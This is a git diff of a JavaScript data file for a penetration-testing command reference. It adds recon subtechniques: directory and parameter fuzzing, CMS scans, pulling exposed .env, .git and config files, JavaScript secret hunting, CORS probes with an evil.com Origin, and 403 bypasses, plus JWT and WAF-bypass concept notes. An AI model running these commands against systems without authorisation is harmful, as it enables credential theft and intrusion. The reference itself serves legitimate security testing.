@@ -70,6 +70,14 @@ const VARIABLES = {
       { method: 'Check used ports', command: 'ss -tlnp', notes: 'Ensure the port is not already in use.' },
     ],
   },
+  '$$PORT': {
+    name: '$$PORT',
+    description: 'Target service port when not running on standard port (e.g. 8080, 8443, 30525)',
+    howToGet: [
+      { method: 'nmap service scan', command: 'nmap -sV -sC -T4 $$IP', notes: 'Identifies all open ports and the services running on them.' },
+      { method: 'From scope / challenge info', notes: 'Often given directly (e.g. HTB machine description, VHost port).' },
+    ],
+  },
   '$$SID': {
     name: '$$SID',
     description: 'Domain SID (Security Identifier)',
@@ -176,6 +184,15 @@ const VARIABLES = {
       { method: 'SecLists DNS', command: 'ls /usr/share/seclists/Discovery/DNS/', notes: 'subdomains-top1million-5000.txt for subdomain bruting.' },
     ],
   },
+  '$$URL': {
+    name: '$$URL',
+    description: 'Target web URL including protocol (e.g. http://example.com or https://10.10.10.5)',
+    howToGet: [
+      { method: 'From scope doc', notes: 'Provided in the engagement scope.' },
+      { method: 'Construct from IP', notes: 'http://$$IP or https://$$IP — check both HTTP and HTTPS.' },
+      { method: 'Construct from domain', notes: 'http://$$DOMAIN — also try www.$$DOMAIN for different server responses.' },
+    ],
+  },
 
   /* ── Active Directory variables ─────────────────────────────────────────── */
   '$$TARGET_HOST': {
@@ -236,12 +253,12 @@ const VARIABLES = {
 const KNOWN_VAR_NAMES = Object.keys(VARIABLES);
 
 const VAR_GROUPS = [
-  { name: 'Target',         vars: ['$$IP', '$$DOMAIN', '$$DC', '$$TARGET_HOST', '$$SID', '$$SHARE', '$$CHILD_DOMAIN', '$$CHILD_SID'] },
+  { name: 'Target',         vars: ['$$IP', '$$PORT', '$$DOMAIN', '$$DC', '$$TARGET_HOST', '$$SID', '$$SHARE', '$$CHILD_DOMAIN', '$$CHILD_SID'] },
   { name: 'Credentials',    vars: ['$$USER', '$$PASSWORD', '$$HASH', '$$TICKET'] },
   { name: 'Attacker',       vars: ['$$LHOST', '$$LPORT'] },
   { name: 'Active Directory', vars: ['$$CA_NAME', '$$ADCS_TEMPLATE', '$$GPO_GUID'] },
   { name: 'SQL Injection',  vars: ['$$VULN_URL', '$$VULN_PARAM', '$$DB_TYPE', '$$DB_NAME', '$$DB_TABLE', '$$DB_COLUMN', '$$DB_USER'] },
-  { name: 'Tools',          vars: ['$$WORDLIST'] },
+  { name: 'Tools',          vars: ['$$WORDLIST', '$$URL'] },
 ];
 
 /* ─── Tag Filtering ──────────────────────────────────────────────────────────── */
@@ -475,14 +492,14 @@ const TACTICS = [
               name: 'Reconnaissance',
               description: 'Passive and active information gathering — enumerate subdomains, discover technologies, and map the attack surface before touching the app.',
               items: ['Subdomain Enumeration', 'DNS Recon', 'Google Dorking', 'OSINT / Hunter.io', 'Wayback Machine', 'Technology Fingerprinting'],
-              itemLinks: { 5: { tacticId: 'webapp', techId: 'web-recon' } },
+              itemLinks: { 0: { tacticId: 'footprinting', techId: 'fp-subdomain' }, 1: { tacticId: 'footprinting', techId: 'fp-dns' }, 2: { tacticId: 'recon', techId: 'recon-passive' }, 3: { tacticId: 'recon', techId: 'recon-passive' }, 4: { tacticId: 'recon', techId: 'recon-passive' }, 5: { tacticId: 'recon', techId: 'recon-web' } },
             },
             {
               icon: '🗺️',
               name: 'Scanning & Enumeration',
               description: 'Actively map directories, parameters, and endpoints. Identify WAF, CMS, and framework versions.',
-              items: ['Directory Bruteforce', 'Parameter Discovery', 'Crawling & Spidering', 'WAF Detection', 'nuclei Scan'],
-              itemLinks: { 0: { tacticId: 'webapp', techId: 'web-recon' }, 1: { tacticId: 'webapp', techId: 'web-recon' }, 3: { tacticId: 'webapp', techId: 'web-recon' }, 4: { tacticId: 'webapp', techId: 'web-recon' } },
+              items: ['Directory Bruteforce', 'Parameter Discovery', 'Crawling & Spidering', 'WAF Detection', 'API Discovery', 'nuclei Scan'],
+              itemLinks: { 0: { tacticId: 'recon', techId: 'recon-web' }, 1: { tacticId: 'recon', techId: 'recon-web' }, 2: { tacticId: 'recon', techId: 'recon-web' }, 3: { tacticId: 'recon', techId: 'recon-web' }, 4: { tacticId: 'recon', techId: 'recon-api' }, 5: { tacticId: 'webapp', techId: 'web-recon' } },
             },
             {
               icon: '🔐',
@@ -496,7 +513,7 @@ const TACTICS = [
               name: 'Injection Testing',
               description: 'Test every input vector for injection vulnerabilities — SQL, XSS, SSTI, command injection, SSRF, and XXE.',
               items: ['SQL Injection', 'Cross-Site Scripting (XSS)', 'Server-Side Template Injection', 'Command Injection', 'SSRF', 'XXE', 'LDAP Injection'],
-              itemLinks: { 0: { tacticId: 'webapp', techId: 'web-sqli-detect' }, 1: { tacticId: 'webapp', techId: 'web-xss' }, 3: { tacticId: 'webapp', techId: 'web-cmdi' }, 4: { tacticId: 'webapp', techId: 'web-ssrf' }, 5: { tacticId: 'webapp', techId: 'web-xxe' } },
+              itemLinks: { 0: { tacticId: 'webapp', techId: 'web-sqli' }, 1: { tacticId: 'webapp', techId: 'web-xss' }, 3: { tacticId: 'webapp', techId: 'web-cmdi' }, 4: { tacticId: 'webapp', techId: 'web-ssrf' }, 5: { tacticId: 'webapp', techId: 'web-xxe' } },
             },
             {
               icon: '📁',
@@ -521,26 +538,26 @@ const TACTICS = [
             },
           ],
           concepts: [
-            { title: 'OWASP Top 10', body: 'The ten most critical web security risks: broken access control, cryptographic failures, injection, insecure design, security misconfiguration, vulnerable components, authentication failures, software integrity failures, logging failures, and SSRF.' },
-            { title: 'Same-Origin Policy (SOP)', body: 'Browser security model preventing a page at origin A from reading responses from origin B. CORS headers explicitly relax SOP. Misconfigured CORS (Access-Control-Allow-Origin: *) can leak sensitive data to attacker-controlled pages.' },
-            { title: 'JWT Attacks', body: 'JSON Web Tokens can be exploited via alg:none (remove signature), RS256→HS256 confusion (sign with public key), weak secrets (brute-force with hashcat), or kid parameter injection pointing to attacker-controlled key.' },
-            { title: 'WAF Bypass', body: 'Web Application Firewalls block common payloads by signature matching. Bypass techniques: case variation (SeLeCt), comment injection (SEL/**/ECT), URL/double encoding (%27 → %2527), HTTP parameter pollution, chunked transfer encoding.' },
-            { title: 'OAuth 2.0 Flows', body: 'OAuth misconfigurations include: open redirect in redirect_uri allowing token theft, state parameter missing enabling CSRF, implicit flow leaking tokens in URL fragments, and scope manipulation. Always test redirect_uri validation and PKCE enforcement.' },
-            { title: 'Content Security Policy (CSP)', body: 'HTTP header restricting which resources a page can load. Weak CSPs (unsafe-inline, data:, wildcard sources) allow XSS. Test via report-uri or browser console errors. CSP bypass via JSONP endpoints, Angular CSP bypass, or allowed-host misuse.' },
+            { name: 'OWASP Top 10', description: 'The ten most critical web security risks: broken access control, cryptographic failures, injection, insecure design, security misconfiguration, vulnerable components, authentication failures, software integrity failures, logging failures, and SSRF.' },
+            { name: 'Same-Origin Policy (SOP)', description: 'Browser security model preventing a page at origin A from reading responses from origin B. CORS headers explicitly relax SOP. Misconfigured CORS (Access-Control-Allow-Origin: *) can leak sensitive data to attacker-controlled pages.' },
+            { name: 'JWT Attacks', description: 'JSON Web Tokens can be exploited via alg:none (remove signature), RS256→HS256 confusion (sign with public key), weak secrets (brute-force with hashcat), or kid parameter injection pointing to attacker-controlled key.' },
+            { name: 'WAF Bypass', description: 'Web Application Firewalls block common payloads by signature matching. Bypass techniques: case variation (SeLeCt), comment injection (SEL/**/ECT), URL/double encoding (%27 → %2527), HTTP parameter pollution, chunked transfer encoding.' },
+            { name: 'OAuth 2.0 Flows', description: 'OAuth misconfigurations include: open redirect in redirect_uri allowing token theft, state parameter missing enabling CSRF, implicit flow leaking tokens in URL fragments, and scope manipulation. Always test redirect_uri validation and PKCE enforcement.' },
+            { name: 'Content Security Policy (CSP)', description: 'HTTP header restricting which resources a page can load. Weak CSPs (unsafe-inline, data:, wildcard sources) allow XSS. Test via report-uri or browser console errors. CSP bypass via JSONP endpoints, Angular CSP bypass, or allowed-host misuse.' },
           ],
           tools: [
-            { name: 'Burp Suite', use: 'Intercepting proxy, active scanner, Repeater, Intruder, and extension platform — the core web app testing tool' },
-            { name: 'ffuf', use: 'Fast web fuzzer — directories, parameters, vhosts, headers' },
-            { name: 'feroxbuster', use: 'Recursive directory brute-forcer with auto-discovery' },
-            { name: 'sqlmap', use: 'Automated SQL injection detection, fingerprinting, and data extraction' },
-            { name: 'nuclei', use: 'Template-based scanner for CVEs, misconfigurations, and known vulnerabilities' },
-            { name: 'whatweb', use: 'Technology fingerprinting — CMS, server, framework, and plugin detection' },
-            { name: 'wafw00f', use: 'WAF detection and fingerprinting' },
-            { name: 'arjun', use: 'Hidden GET/POST parameter discovery via wordlists and heuristics' },
-            { name: 'nikto', use: 'Web server misconfiguration and vulnerability scanner' },
-            { name: 'wfuzz', use: 'Fuzzer for parameters, cookies, headers, and authentication fields' },
-            { name: 'amass', use: 'Subdomain enumeration and attack surface mapping via OSINT' },
-            { name: 'httpx', use: 'Fast HTTP probing — title, status code, tech detection across many hosts' },
+            { name: 'Burp Suite', purpose: 'Intercepting proxy, active scanner, Repeater, Intruder, and extension platform — the core web app testing tool' },
+            { name: 'ffuf', purpose: 'Fast web fuzzer — directories, parameters, vhosts, headers' },
+            { name: 'feroxbuster', purpose: 'Recursive directory brute-forcer with auto-discovery' },
+            { name: 'sqlmap', purpose: 'Automated SQL injection detection, fingerprinting, and data extraction' },
+            { name: 'nuclei', purpose: 'Template-based scanner for CVEs, misconfigurations, and known vulnerabilities' },
+            { name: 'whatweb', purpose: 'Technology fingerprinting — CMS, server, framework, and plugin detection' },
+            { name: 'wafw00f', purpose: 'WAF detection and fingerprinting' },
+            { name: 'arjun', purpose: 'Hidden GET/POST parameter discovery via wordlists and heuristics' },
+            { name: 'nikto', purpose: 'Web server misconfiguration and vulnerability scanner' },
+            { name: 'wfuzz', purpose: 'Fuzzer for parameters, cookies, headers, and authentication fields' },
+            { name: 'amass', purpose: 'Subdomain enumeration and attack surface mapping via OSINT' },
+            { name: 'httpx', purpose: 'Fast HTTP probing — title, status code, tech detection across many hosts' },
           ],
         },
       },
@@ -566,38 +583,229 @@ const TACTICS = [
         ],
       },
       {
-        id: 'recon-smb',
-        name: 'SMB Enumeration',
-        description: 'Enumerate SMB shares, users, and OS info from port 445.',
-        tags: ['smb', 'windows'],
-        commands: [
-          { id: 'smb1', label: 'enum4linux-ng', os: 'Linux', command: 'enum4linux-ng -A $$IP', notes: 'Modern rewrite of enum4linux.' },
-          { id: 'smb2', label: 'List shares (anon)', os: 'Linux', command: 'crackmapexec smb $$IP -u "" -p "" --shares', notes: 'Anonymous share listing.' },
-          { id: 'smb3', label: 'List shares (auth)', os: 'Linux', command: 'crackmapexec smb $$IP -u $$USER -p $$PASSWORD --shares', notes: '' },
-          { id: 'smb4', label: 'smbclient connect', os: 'Linux', command: 'smbclient //$$IP/$$SHARE -U $$USER%$$PASSWORD', notes: '' },
-        ],
-      },
-      {
-        id: 'recon-ldap',
-        name: 'LDAP Enumeration',
-        description: 'Query Active Directory via LDAP to enumerate users, groups, and policies.',
-        tags: ['ldap', 'active-directory', 'windows'],
-        commands: [
-          { id: 'ldap1', label: 'Anonymous LDAP dump', os: 'Linux', command: 'ldapsearch -x -H ldap://$$DC -b "DC=$$DOMAIN,DC=local" "(objectClass=*)"', notes: 'Works if null session is allowed.' },
-          { id: 'ldap2', label: 'Authenticated user list', os: 'Linux', command: 'ldapsearch -x -H ldap://$$DC -D "$$USER@$$DOMAIN" -w $$PASSWORD -b "DC=$$DOMAIN,DC=local" "(objectClass=user)" sAMAccountName', notes: '' },
-          { id: 'ldap3', label: 'BloodHound collection', os: 'Linux', command: 'bloodhound-python -u $$USER -p $$PASSWORD -d $$DOMAIN -dc $$DC -c all', notes: 'Collects all BloodHound data remotely.' },
-        ],
-      },
-      {
         id: 'recon-web',
         name: 'Web Enumeration',
-        description: 'Discover web endpoints, files, and technologies on HTTP/HTTPS services.',
+        description: 'Discover web endpoints, fingerprint technologies, enumerate virtual hosts, and crawl web applications.',
         tags: ['web', 'http'],
-        commands: [
-          { id: 'web1', label: 'ffuf dir brute', os: 'Linux', command: 'ffuf -u http://$$IP/FUZZ -w $$WORDLIST -mc 200,301,302', notes: '' },
-          { id: 'web2', label: 'ffuf vhost fuzz', os: 'Linux', command: 'ffuf -u http://$$IP -H "Host: FUZZ.$$DOMAIN" -w $$WORDLIST -fs 0', notes: 'Fuzz virtual hosts.' },
-          { id: 'web3', label: 'nikto scan', os: 'Linux', command: 'nikto -h http://$$IP', notes: 'Noisy but thorough.' },
-          { id: 'web4', label: 'whatweb fingerprint', os: 'Linux', command: 'whatweb http://$$IP', notes: 'Identify web stack quickly.' },
+        subtechniques: [
+          {
+            id: 'rweb-dir',
+            name: 'Directory & File Brute Force',
+            commands: [
+            { id: 'web1', label: 'ffuf dir brute', os: 'Linux', command: 'ffuf -w $$WORDLIST -u $$URL/FUZZ', notes: '' },
+            { id: 'rweb1', label: 'ffuf file fuzzing', os: 'Linux', command: 'ffuf -w $$WORDLIST -u $$URL/FUZZ -e .php,.html,.txt,.bak,.js -v -mc 200,301', notes: 'Appends each extension to every wordlist entry. -v shows full URL per match.' },
+            { id: 'rweb1b', label: 'ffuf recursive', os: 'Linux', command: 'ffuf -w $$WORDLIST -u $$URL/FUZZ -e .html -recursion -recursion-depth 2 -rate 500 -t 100 -v', notes: '-recursion auto-dives into discovered directories. -rate 500 caps requests/sec to avoid overwhelming the server.' },
+            { id: 'rweb2', label: 'gobuster dir', os: 'Linux', command: 'gobuster dir -u $$URL -w $$WORDLIST -x php,html,txt -t 50 -b 404', notes: '-b excludes status codes. -s includes only specified codes. --exclude-length skips responses of a given byte size.' },
+            { id: 'rweb2b', label: 'gobuster (exclude length)', os: 'Linux', command: 'gobuster dir -u $$URL -w $$WORDLIST --exclude-length 0 -t 50', notes: 'Skips empty-body responses — useful when the server returns 200 for all paths.' },
+            { id: 'rweb3', label: 'feroxbuster recursive', os: 'Linux', command: 'feroxbuster -u $$URL -w $$WORDLIST -x php,html,txt --depth 3', notes: 'Auto-recursive scanner. Follows every discovered directory automatically.' },
+            { id: 'rweb3b', label: 'feroxbuster filtered', os: 'Linux', command: 'feroxbuster -u $$URL -w $$WORDLIST -C 404,500 -S 1024 --dont-scan /uploads', notes: '-C filters by status code, -S filters by response size (bytes), --dont-scan skips known noise paths.' },
+            { id: 'rweb3c', label: 'wenum dir fuzz', os: 'Linux', command: 'wenum -w $$WORDLIST --hc 404 -u "$$URL/FUZZ"', notes: 'wfuzz successor. --hc hides matching codes; --sc shows only matching; --hs hides by size; --hw hides by word count.' },
+            ]
+          },
+          {
+            id: 'rweb-param',
+            name: 'Parameter Fuzzing',
+            commands: [
+            { id: 'rweb-p1', label: 'GET param discovery (ffuf)', os: 'Linux', command: 'ffuf -w $$WORDLIST -u "$$URL/page.php?FUZZ=test" -mc 200 -fw 219', notes: 'Replace 219 with the word count from the baseline response to filter false positives. Use -fc 404 or -fs <size> alternatively.' },
+            { id: 'rweb-p2', label: 'GET param value fuzz (ffuf)', os: 'Linux', command: 'ffuf -w $$WORDLIST -u "$$URL/page.php?param=FUZZ" -mc 200', notes: 'Once parameter name is known, fuzz its value for injection or bypass.' },
+            { id: 'rweb-p3', label: 'GET param fuzz (wenum)', os: 'Linux', command: 'wenum -w $$WORDLIST --hc 404 -u "http://$$IP:$$PORT/get.php?x=FUZZ"', notes: 'wenum (wfuzz successor) — --hc hides unwanted codes, --sc shows only matching, --hw filters by word count.' },
+            { id: 'rweb-p4', label: 'Probe POST params (curl)', os: 'Linux', command: 'curl -d "" http://$$IP:$$PORT/post.php', notes: 'Empty POST body — server error often reveals the expected parameter name in the response.' },
+            { id: 'rweb-p5', label: 'POST param value fuzz (ffuf)', os: 'Linux', command: 'ffuf -u $$URL/post.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "param=FUZZ" -w $$WORDLIST -mc 200 -v', notes: 'Replace "param" with the discovered parameter name. -mc 200 matches only successful responses.' },
+            { id: 'rweb-p6', label: 'Verify POST param (curl)', os: 'Linux', command: 'curl -d "param=VALUE" http://$$IP:$$PORT/post.php', notes: 'Confirm the found param value works before moving to exploitation.' },
+            ]
+          },
+          {
+            id: 'rweb-vhost',
+            name: 'VHost Enumeration',
+            commands: [
+            { id: 'web2', label: 'ffuf vhost fuzz', os: 'Linux', command: 'ffuf -u $$URL -H "Host: FUZZ.$$DOMAIN" -w $$WORDLIST -fs 0', notes: 'Fuzz virtual hosts via Host header manipulation. Use -fs to filter out the default page size.' },
+            { id: 'rweb4', label: 'gobuster vhost', os: 'Linux', command: 'gobuster vhost -u $$URL -w $$WORDLIST --append-domain --domain $$DOMAIN', notes: '--append-domain appends the domain suffix to each wordlist entry (e.g. dev → dev.example.com).' },
+            ]
+          },
+          {
+            id: 'rweb-fp',
+            name: 'Fingerprinting',
+            commands: [
+            { id: 'rweb5', label: 'Banner grab (curl)', os: 'Linux', command: 'curl -I $$URL', notes: 'Check Server, X-Powered-By, Set-Cookie, and other disclosure headers. Try both http:// and www. variants.' },
+            { id: 'web4', label: 'whatweb', os: 'Linux', command: 'whatweb $$URL', notes: 'Identify CMS, frameworks, server version, and JavaScript libraries.' },
+            { id: 'rweb6', label: 'WAF detection (wafw00f)', os: 'Linux', command: 'wafw00f $$URL', notes: 'Detect and fingerprint Web Application Firewalls — affects payloads and evasion strategy.' },
+            { id: 'web3', label: 'nikto scan', os: 'Linux', command: 'nikto -h $$URL', notes: 'Noisy but thorough — checks for misconfigs, default files, and known vulnerabilities.' },
+            { id: 'rweb7', label: 'nikto software id', os: 'Linux', command: 'nikto -h $$URL -Tuning b', notes: 'Tuning b limits scan to software identification only — less noisy.' },
+            { id: 'rweb8', label: 'robots.txt', os: 'Linux', command: 'curl -s $$URL/robots.txt', notes: 'Disallowed paths often point to admin panels or sensitive directories.' },
+            { id: 'rweb9', label: 'sitemap.xml', os: 'Linux', command: 'curl -s $$URL/sitemap.xml', notes: 'Full index of crawlable pages — useful for coverage mapping.' },
+            { id: 'rweb10', label: 'security.txt (well-known)', os: 'Linux', command: 'curl -s $$URL/.well-known/security.txt', notes: 'Vulnerability disclosure policy. May also reveal bug bounty scope or contacts.' },
+            ]
+          },
+          {
+            id: 'rweb-crawl',
+            name: 'Web Crawling',
+            commands: [
+            { id: 'rweb11', label: 'ReconSpider crawl', os: 'Linux', command: 'python3 ReconSpider.py $$URL', notes: 'Output saved to results.json. Extracts links, emails, IP addresses, and interesting paths from page source.' },
+            { id: 'rweb12', label: 'wget mirror (offline)', os: 'Linux', command: 'wget --mirror --convert-links --adjust-extension --page-requisites --no-parent $$URL', notes: 'Download full site for offline analysis. Useful on slow or unreliable connections.' },
+            { id: 'rweb12b', label: 'hakrawler crawl', os: 'Linux', command: 'echo $$URL | hakrawler -d 3 -subs -u', notes: '-d sets crawl depth, -subs includes subdomains, -u deduplicates URLs. Pipe to grep for targeted filtering.' },
+            { id: 'rweb12c', label: 'katana crawl', os: 'Linux', command: 'katana -u $$URL -d 3 -jc -kf all -o katana_out.txt', notes: '-jc parses JavaScript for endpoints, -kf all extracts known files. Fast Projectdiscovery crawler.' },
+            ]
+          },
+          {
+            id: 'rweb-ssl',
+            name: 'SSL / TLS Analysis',
+            commands: [
+            { id: 'rweb-s1', label: 'testssl.sh full check', os: 'Linux', command: 'testssl.sh $$DOMAIN', notes: 'Checks all SSL/TLS versions, ciphers, certificate info, and vulnerabilities (POODLE, Heartbleed, BEAST, ROBOT, etc.).' },
+            { id: 'rweb-s2', label: 'testssl.sh save report', os: 'Linux', command: 'testssl.sh --jsonfile results.json --htmlfile results.html $$DOMAIN', notes: 'Output full report in JSON and HTML.' },
+            { id: 'rweb-s3', label: 'sslscan', os: 'Linux', command: 'sslscan $$DOMAIN', notes: 'Enumerates supported TLS versions, cipher suites, and certificate details. Faster than testssl for quick checks.' },
+            { id: 'rweb-s4', label: 'sslyze', os: 'Linux', command: 'sslyze $$DOMAIN --regular', notes: '--regular runs certificate, cipher, protocol, and renegotiation checks.' },
+            { id: 'rweb-s5', label: 'nmap SSL scripts', os: 'Linux', command: 'nmap -sV --script ssl-enum-ciphers,ssl-cert,ssl-poodle,ssl-heartbleed -p 443 $$IP', notes: 'Quick SSL audit via Nmap NSE scripts.' },
+            { id: 'rweb-s6', label: 'Cert info (openssl)', os: 'Linux', command: 'openssl s_client -connect $$DOMAIN:443 </dev/null | openssl x509 -noout -text', notes: 'Prints full certificate: issuer, expiry, SANs, key size. SANs often reveal internal hostnames.' },
+            ]
+          },
+          {
+            id: 'rweb-cms',
+            name: 'CMS Enumeration',
+            commands: [
+            { id: 'rweb-c1', label: 'WordPress (wpscan)', os: 'Linux', command: 'wpscan --url $$URL --enumerate p,t,u --plugins-detection aggressive', notes: '-e p = plugins, t = themes, u = users. Requires WordPress to be installed.' },
+            { id: 'rweb-c2', label: 'WordPress user enum', os: 'Linux', command: 'wpscan --url $$URL --enumerate u', notes: 'Enumerate users via author archives. Combine with password attack: --password-attack xmlrpc.' },
+            { id: 'rweb-c3', label: 'WordPress vuln scan', os: 'Linux', command: 'wpscan --url $$URL --api-token YOUR_TOKEN --enumerate vp', notes: 'vp = vulnerable plugins. Free API token from wpscan.com gives 25 daily API calls.' },
+            { id: 'rweb-c4', label: 'Joomla (joomscan)', os: 'Linux', command: 'joomscan --url $$URL', notes: 'Identifies Joomla version, installed components, and known CVEs.' },
+            { id: 'rweb-c5', label: 'Drupal (droopescan)', os: 'Linux', command: 'droopescan scan drupal -u $$URL', notes: 'Detects Drupal version, plugins, and themes. Also supports: silverstripe, wordpress, joomla, moodle.' },
+            { id: 'rweb-c6', label: 'CMSeeK', os: 'Linux', command: 'python3 cmseek.py -u $$URL', notes: 'Auto-detects CMS type (WordPress, Joomla, Drupal, Laravel, etc.) and runs appropriate scan.' },
+            { id: 'rweb-c7', label: 'Manual version (readme)', os: 'Linux', command: 'curl -s $$URL/README.txt && curl -s $$URL/CHANGELOG.txt && curl -s $$URL/wp-login.php', notes: 'WordPress: /readme.html or /readme.txt often shows exact version. Joomla: /administrator/manifests/files/joomla.xml.' },
+            ]
+          },
+          {
+            id: 'rweb-js',
+            name: 'JavaScript Analysis',
+            commands: [
+            { id: 'rweb-j1', label: 'Collect all JS files (getJS)', os: 'Linux', command: 'getJS --url $$URL --output js_files.txt', notes: 'Fetches all JS file URLs from a page. Pipe into curl or wget for download.' },
+            { id: 'rweb-j2', label: 'Extract JS endpoints (LinkFinder)', os: 'Linux', command: 'python3 LinkFinder.py -i $$URL -d -o results.html', notes: '-d crawls for JS files automatically. Extracts API endpoints, internal paths, and relative URLs from JS.' },
+            { id: 'rweb-j3', label: 'Find secrets in JS (SecretFinder)', os: 'Linux', command: 'python3 SecretFinder.py -i $$URL/app.js -o cli', notes: 'Regex-based scanner for API keys, tokens, AWS credentials, and other secrets in JavaScript files.' },
+            { id: 'rweb-j4', label: 'Mine URLs from JS (gau)', os: 'Linux', command: 'gau --providers wayback,otx,commoncrawl $$DOMAIN | grep "\\.js" | sort -u', notes: 'Get All URLs — pulls from Wayback, OTX, and CommonCrawl. Filter for JS files to prioritize.' },
+            { id: 'rweb-j5', label: 'Grep JS for secrets', os: 'Linux', command: 'curl -s $$URL/app.js | grep -Ei "(api[_-]?key|token|secret|password|auth|bearer|private|credential)" ', notes: 'Quick manual check for hardcoded secrets. Also look for internal IP addresses and dev endpoints.' },
+            { id: 'rweb-j6', label: 'Beautify minified JS', os: 'Linux', command: 'curl -s $$URL/app.min.js | js-beautify -o app_readable.js', notes: 'Minified JS is unreadable — beautify before grepping or manual review.' },
+            ]
+          },
+          {
+            id: 'rweb-expose',
+            name: 'Source Code Exposure',
+            commands: [
+            { id: 'rweb-e1', label: '.git directory exposed', os: 'Linux', command: 'curl -s $$URL/.git/HEAD', notes: 'Response "ref: refs/heads/main" confirms .git is exposed. Dump entire repo with git-dumper.' },
+            { id: 'rweb-e2', label: 'git-dumper (full repo)', os: 'Linux', command: 'git-dumper $$URL/.git ./dumped_repo', notes: 'Reconstructs the full git repository from an exposed .git directory. Install: pip install git-dumper.' },
+            { id: 'rweb-e3', label: '.env file exposed', os: 'Linux', command: 'curl -s $$URL/.env', notes: 'Often contains database credentials, API keys, and APP_KEY. A single hit here can compromise the entire app.' },
+            { id: 'rweb-e4', label: 'Backup file brute (ffuf)', os: 'Linux', command: 'ffuf -u $$URL/FUZZ -w $$WORDLIST -e .bak,.old,.orig,.backup,.zip,.tar.gz,.sql -mc 200', notes: 'Hunt for forgotten backup files. Common finds: index.php.bak, config.php.old, db.sql.' },
+            { id: 'rweb-e5', label: 'Config file exposure', os: 'Linux', command: 'curl -s $$URL/config.php && curl -s $$URL/wp-config.php && curl -s $$URL/config.yml', notes: 'Common config file paths across frameworks. Source code typically not returned — look for 200 vs 404.' },
+            { id: 'rweb-e6', label: '.svn exposure', os: 'Linux', command: 'curl -s $$URL/.svn/entries', notes: 'SVN equivalent of .git. If exposed, use svn-extractor to dump the full working copy.' },
+            { id: 'rweb-e7', label: 'Docker/compose exposure', os: 'Linux', command: 'curl -s $$URL/Dockerfile && curl -s $$URL/docker-compose.yml', notes: 'Reveals base images, env vars, ports, and internal service names. Common in misconfigured dev boxes.' },
+            { id: 'rweb-e8', label: '.DS_Store exposure', os: 'Linux', command: 'curl -s $$URL/.DS_Store | xxd | head', notes: 'macOS metadata file — contains directory structure listing. Parse with ds-store-parser to enumerate hidden paths.' },
+            ]
+          },
+          {
+            id: 'rweb-http',
+            name: 'HTTP Headers & Methods',
+            commands: [
+            { id: 'rweb-h1', label: 'Allowed methods (OPTIONS)', os: 'Linux', command: 'curl -I -X OPTIONS $$URL', notes: 'Check the Allow response header for unexpected methods (PUT, DELETE, TRACE, PATCH).' },
+            { id: 'rweb-h2', label: 'TRACE method test', os: 'Linux', command: 'curl -X TRACE $$URL -v', notes: 'TRACE enabled = XST (Cross-Site Tracing) vulnerability. Should always be disabled.' },
+            { id: 'rweb-h3', label: 'CORS misconfiguration', os: 'Linux', command: 'curl -I -H "Origin: https://evil.com" $$URL', notes: 'Check Access-Control-Allow-Origin in response. If it reflects evil.com → CORS misconfiguration.' },
+            { id: 'rweb-h4', label: 'Security headers audit', os: 'Linux', command: 'curl -I $$URL | grep -iE "(x-frame|content-security|strict-transport|x-content-type|referrer-policy|permissions-policy)"', notes: 'Missing headers = findings: no CSP, no HSTS, no X-Frame-Options, no X-Content-Type-Options.' },
+            { id: 'rweb-h5', label: 'Cookie flags check', os: 'Linux', command: 'curl -I $$URL | grep -i "set-cookie"', notes: 'Look for missing Secure, HttpOnly, and SameSite flags on session cookies.' },
+            { id: 'rweb-h6', label: 'CSP header full view', os: 'Linux', command: 'curl -sI $$URL | grep -i "content-security-policy"', notes: 'Weak CSP (unsafe-inline, unsafe-eval, wildcard *) allows XSS. Also check for report-uri endpoints.' },
+            { id: 'rweb-h7', label: 'HSTS check', os: 'Linux', command: 'curl -sI https://$$DOMAIN | grep -i "strict-transport"', notes: 'Strict-Transport-Security should include max-age ≥31536000 and ideally includeSubDomains.' },
+            { id: 'rweb-h8', label: '403 bypass (path manipulation)', os: 'Linux', command: 'ffuf -u $$URL/FUZZ -w /dev/null -request-proto http -H "X-Original-URL: /admin" -mc 200,301,302', notes: 'Also try: /admin/, /.admin, /admin../, /admin%2f, and headers: X-Rewrite-URL, X-Forwarded-For: 127.0.0.1.' },
+            ]
+          }
+        ],
+      },
+      {
+        id: 'recon-api',
+        name: 'API Discovery',
+        description: 'Discover and probe REST, SOAP, and GraphQL APIs — endpoint enumeration, schema extraction, and vulnerability testing.',
+        tags: ['api', 'rest', 'graphql', 'soap', 'web'],
+        subtechniques: [
+          {
+            id: 'api-rest',
+            name: 'REST API',
+            commands: [
+            { id: 'api1', label: 'Endpoint discovery (ffuf)', os: 'Linux', command: 'ffuf -u $$URL/FUZZ -w $$WORDLIST -mc 200,201,204,301,302,400,401,403,405 -t 50', notes: 'Include 4xx codes — REST APIs return 401/403 for valid-but-unauthenticated endpoints, and 400 for missing required params.' },
+            { id: 'api2', label: 'API version prefix brute', os: 'Linux', command: 'ffuf -u $$URL/FUZZ/endpoint -w $$WORDLIST -mc 200,201,301,400,401,403', notes: 'Try v1/, v2/, api/, api/v1/. SecLists/Discovery/Web-Content/api/ has a useful wordlist.' },
+            { id: 'api3', label: 'GET parameter fuzz', os: 'Linux', command: 'ffuf -u "$$URL/api/user?FUZZ=test" -w $$WORDLIST -mc 200,201,400,401', notes: 'Discover hidden GET parameters on a known API endpoint.' },
+            { id: 'api4', label: 'Response header check', os: 'Linux', command: 'curl -I $$URL/api', notes: 'Look for X-Powered-By, API-Version, X-API-Version, and custom disclosure headers.' },
+            ]
+          },
+          {
+            id: 'api-soap',
+            name: 'SOAP / WSDL',
+            commands: [
+            { id: 'api5', label: 'Fetch WSDL', os: 'Linux', command: 'curl -s "$$URL/service?wsdl"', notes: 'WSDL is your attack blueprint — lists all operations, parameters, data types, and request format. Equivalent to a full API spec.' },
+            { id: 'api6', label: 'Brute WSDL paths', os: 'Linux', command: 'ffuf -u $$URL/FUZZ -w $$WORDLIST -mc 200 -e ?wsdl,.wsdl', notes: 'Common paths: /wsdl, /service.wsdl, /service?wsdl, /api.wsdl, /ws?wsdl.' },
+            { id: 'api7', label: 'Send SOAP request', os: 'Linux', command: 'curl -X POST $$URL/service -H "Content-Type: text/xml" -d \'<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"><soapenv:Body><GetUser><id>1</id></GetUser></soapenv:Body></soapenv:Envelope>\'', notes: 'Template — replace operation name and parameters from WSDL. Intercept via Burp for easier modification.' },
